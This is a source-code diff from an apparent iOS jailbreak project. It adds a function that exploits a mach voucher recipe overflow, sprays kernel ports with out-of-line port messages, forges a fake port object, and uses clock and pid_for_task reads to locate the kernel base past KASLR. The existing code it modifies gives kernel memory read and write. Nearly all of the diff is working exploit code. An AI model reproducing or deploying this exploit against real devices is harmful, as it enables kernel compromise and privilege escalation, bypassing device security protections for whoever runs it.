@@ -13,7 +13,11 @@
 #include <mach/mach_voucher_types.h>
 #include <mach/port.h>
 
+#import <mach-o/loader.h>
+#import <sys/mman.h>
+
 #include <CoreFoundation/CoreFoundation.h>
+#import <Foundation/Foundation.h>
 
 #include "offsets.h"
 
@@ -21,6 +25,27 @@
 
 #define kIOMasterPortDefault MACH_PORT_NULL
 #define IO_OBJECT_NULL MACH_PORT_NULL
+#define IO_BITS_ACTIVE 0x80000000
+#define	IKOT_TASK 2
+#define IKOT_IOKIT_CONNECT 29
+#define IKOT_CLOCK 25
+
+extern uint64_t procoff;
+
+typedef struct {
+    mach_msg_header_t head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_ports_descriptor_t desc[256];
+    char pad[4096];
+} sprz;
+
+typedef natural_t not_natural_t;
+
+struct not_essers_ipc_object {
+    not_natural_t io_bits;
+    not_natural_t io_references;
+    char    io_lock_data[1337];
+};
 
 typedef mach_port_t io_iterator_t;
 typedef mach_port_t io_service_t;
@@ -392,10 +417,10 @@ void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
     // associate the pthread_t with the port so that we can join the correct pthread
     // when we receive the exception message and it exits:
     kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
-    printf("set context\n");
+    //printf("set context\n");
     // wait until the message has actually been sent:
     while (!port_has_message(port)) { ; }
-    printf("message was sent\n");
+    //printf("message was sent\n");
 }
 
 // the returned pointer is only valid until the next call to this function
@@ -508,6 +533,184 @@ void wk64(uint64_t address, uint64_t value) {
     wk128(address, new);
 }
 
+uint64_t find_kernel_ptr(){
+    mach_port_t vch = 0;
+    
+    mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
+    data->content_size = 0;
+    data->key=MACH_VOUCHER_ATTR_KEY_BANK;
+    data->command=610;
+    data->previous_voucher=MACH_PORT_NULL;
+    
+    kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
+    
+    assert(lol==0 && vch!=0);
+    
+    
+    unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+    unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
+    assert(fdata == odata + 0x4000);
+    memset(odata, 0x42, 0x0);
+    
+    
+    uint64_t rsz = 0x100; // alloc size;
+    fdata -= rsz + 0x100; // overflow full chunk
+    
+    struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
+    
+    mlock(fakeport, 0x8000);
+    
+    fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
+    fakeport->io_lock_data[12] = 0x11;
+    
+    *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
+    
+    
+    mach_port_t* ports = calloc(800, sizeof(mach_port_t));
+    
+    for (int i = 0; i < 800; i++) {
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
+        mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
+    }
+    sprz msg1;
+    
+    memset(&msg1, 0, sizeof(sprz));
+    sprz msg2;
+    
+    memset(&msg2, 0, sizeof(sprz));
+    msg1.msgh_body.msgh_descriptor_count = 128;
+    
+    msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    msg1.head.msgh_local_port = MACH_PORT_NULL;
+    msg1.head.msgh_size = sizeof(msg1)-2048;
+    
+    mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
+    for (int i = 0; i < 0x1000; i++) {
+        buffer[i] = MACH_PORT_DEAD;
+    }
+    
+    for (int i = 0; i < 256; i++) {
+        msg1.desc[i].address = buffer;
+        msg1.desc[i].count = 0x100/8;
+        msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+        msg1.desc[i].disposition = 19;
+    }
+    
+    pthread_yield_np();
+    for (int i=1; i<300; i++) {
+        msg1.head.msgh_remote_port = ports[i];
+        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
+        assert(kret==0);
+    }
+    
+    pthread_yield_np();
+    for (int i=500; i<800; i++) {
+        msg1.head.msgh_remote_port = ports[i];
+        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
+        assert(kret==0);
+    }
+    
+    pthread_yield_np();
+    for (int i=300; i<500; i++) {
+        msg1.head.msgh_remote_port = ports[i];
+        if (i%4 == 0) {
+            msg1.msgh_body.msgh_descriptor_count = 1;
+        } else {
+            msg1.msgh_body.msgh_descriptor_count = 256;
+        }
+        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
+        assert(kret==0);
+    }
+    
+    pthread_yield_np();
+    for (int i = 300; i<500; i+=4) {
+        msg2.head.msgh_local_port = ports[i];
+        kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
+        if(!(i < 380))
+        ports[i] = 0;
+        assert(kret==0);
+    }
+    for (int i = 300; i<380; i+=4) {
+        msg1.head.msgh_remote_port = ports[i];
+        msg1.msgh_body.msgh_descriptor_count = 1;
+        kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
+        assert(kret==0);
+    }
+    
+    mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
+    mach_port_t foundport = 0;
+    for (int i=1; i<500; i++) {
+        if (ports[i]) {
+            msg1.head.msgh_local_port = ports[i];
+            pthread_yield_np();
+            kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
+            assert(kret==0);
+            for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
+                mach_port_t* ptz = msg1.desc[k].address;
+                for (int z = 0; z < 0x100/8; z++) {
+                    if (ptz[z] != MACH_PORT_DEAD) {
+                        if (ptz[z]) {
+                            foundport = ptz[z];
+                            goto foundp;
+                        }
+                        
+                    }
+                }
+            }
+            mach_msg_destroy(&msg1.head);
+            mach_port_deallocate(mach_task_self(), ports[i]);
+            ports[i] = 0;
+        }
+    }
+    printf("failed, retry");
+    return 0x0;
+foundp:
+    printf("found corruption %x", foundport);
+    
+    uint64_t textbase = 0xfffffff007004000;
+    
+    for (int i = 0; i < 0x300; i++) {
+        for (int k = 0; k < 0x40000; k+=8) {
+            *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
+            *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
+            
+            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
+            
+            if (kret != KERN_FAILURE) {
+                goto gotclock;
+            }
+        }
+    }
+    printf("failed, retry");
+    return 0x0;
+    
+gotclock:;
+    uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
+    
+    leaked_ptr &= ~0x3FFF;
+    
+    fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
+    fakeport->io_references = 0xff;
+    char* faketask = ((char*)fakeport) + 0x1000;
+    
+    *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
+    *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
+    *(uint64_t*) (faketask + 0x10) = 0xee;
+    
+    while (1) {
+        int32_t leaked = 0;
+        *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
+        pid_for_task(foundport, &leaked);
+        if (leaked == MH_MAGIC_64) {
+            printf("found kernel text at %llx", leaked_ptr);
+            break;
+        }
+        leaked_ptr -= 0x4000;
+    }
+    
+    return leaked_ptr;
+}
+
 uint64_t prepare_kernel_rw() {
     int prealloc_size = 0x900; // kalloc.4096
 
@@ -546,9 +749,9 @@ uint64_t prepare_kernel_rw() {
     // receive on the first port, reading the header of the second:
     uint64_t* buf = receive_prealloc_msg(first_port);
 
-    for (int i = 0; i < 8; i++) {
+    /*for (int i = 0; i < 8; i++) {
         printf("0x%llx\n", buf[i]);
-    }
+    }*/
 
     kernel_buffer_base = buf[1];
 
@@ -566,10 +769,10 @@ uint64_t prepare_kernel_rw() {
 
     // read back the start of the userclient buffer:
     buf = receive_prealloc_msg(first_port);
-    printf("user client? :\n");
-    for (int i = 0; i < 8; i++) {
+    //printf("user client? :\n");
+    /*for (int i = 0; i < 8; i++) {
         printf("0x%llx\n", buf[i]);
-    }
+    }*/
 
     // save a copy of the original object:
     memcpy(legit_object, buf, sizeof(legit_object));
@@ -578,8 +781,9 @@ uint64_t prepare_kernel_rw() {
     uint64_t vtable = buf[0];
 
     // rebase the symbols
+    printf("vtable: 0x%llx\n",vtable);
     kaslr_shift = vtable - 0xFFFFFFF006FA2C50;
-
+    printf("kaslr_shift: 0x%llx\n",kaslr_shift);
     kernel_base = off1 + kaslr_shift;
     get_metaclass = off2 + kaslr_shift;
     osserializer_serialize = off3 + kaslr_shift;
@@ -597,6 +801,7 @@ uint64_t prepare_kernel_rw() {
 
 int jb_go() {
     load_offsets();
+    //printf("kernel_ptr 0x%016llx",find_kernel_ptr());
     uint64_t kernel_base = prepare_kernel_rw();
     uint64_t val = rk64(kernel_base);
     printf("read from kernel memory: 0x%016llx\n", val);
